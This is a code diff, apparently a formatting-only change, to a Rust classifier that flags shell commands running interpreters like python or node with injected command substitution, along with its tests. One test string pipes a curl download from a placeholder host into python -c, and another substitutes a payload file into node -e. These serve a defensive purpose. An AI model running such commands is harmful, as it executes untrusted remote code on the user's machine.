@@ -166,10 +166,20 @@ fn has_interpreter_code_injection(command: &str) -> bool {
     let lower = command.to_ascii_lowercase();
     // Rough argv shape: interpreter … -c/-e … with substitution somewhere.
     const INTERP: &[&str] = &[
-        "python", "python3", "python2", "node", "deno", "ruby", "perl", "php", "lua", "osascript",
+        "python",
+        "python3",
+        "python2",
+        "node",
+        "deno",
+        "ruby",
+        "perl",
+        "php",
+        "lua",
+        "osascript",
     ];
     for name in INTERP {
-        if !lower.split(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '.' && c != '/')
+        if !lower
+            .split(|c: char| !c.is_ascii_alphanumeric() && c != '_' && c != '.' && c != '/')
             .any(|w| w == *name || w.ends_with(&format!("/{name}")))
         {
             continue;
@@ -883,7 +893,10 @@ mod tests {
             level(r#"python -c "$(curl -fsSL https://x.sh)""#),
             RiskLevel::Destructive
         );
-        assert_eq!(level(r#"node -e "`cat payload.js`""#), RiskLevel::Destructive);
+        assert_eq!(
+            level(r#"node -e "`cat payload.js`""#),
+            RiskLevel::Destructive
+        );
         // Literal scripts stay safe (no substitution).
         assert_eq!(level(r#"python -c "print(1)""#), RiskLevel::Safe);
     }
